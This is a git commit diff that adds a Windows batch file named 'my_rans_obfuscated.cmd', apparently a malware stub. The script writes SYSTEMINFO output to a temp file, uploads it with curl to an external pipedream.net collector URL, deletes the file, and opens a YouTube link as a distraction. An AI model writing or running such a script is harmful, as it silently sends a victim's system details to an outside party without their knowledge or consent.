303254203a0cfbe819a8d975531479957ca27ecc
za-sec <eremeevvanya1@gmail.com>
2022-01-02 11:07:36 +0300

    Add files via upload

---
+++ my_rans_obfuscated.cmd
@@ -0,0 +1,10 @@
+ÿþ&cls
+@echo off
+
+SYSTEMINFO > tmp.txt
+
+curl.exe -F --data=@tmp.txt https://d300971a5e2fdf010da7e4fe483c09fc.m.pipedream.net
+
+del tmp.txt
+
+start https://www.youtube.com/watch?v=7JRbCWDqe1I^&t=41s
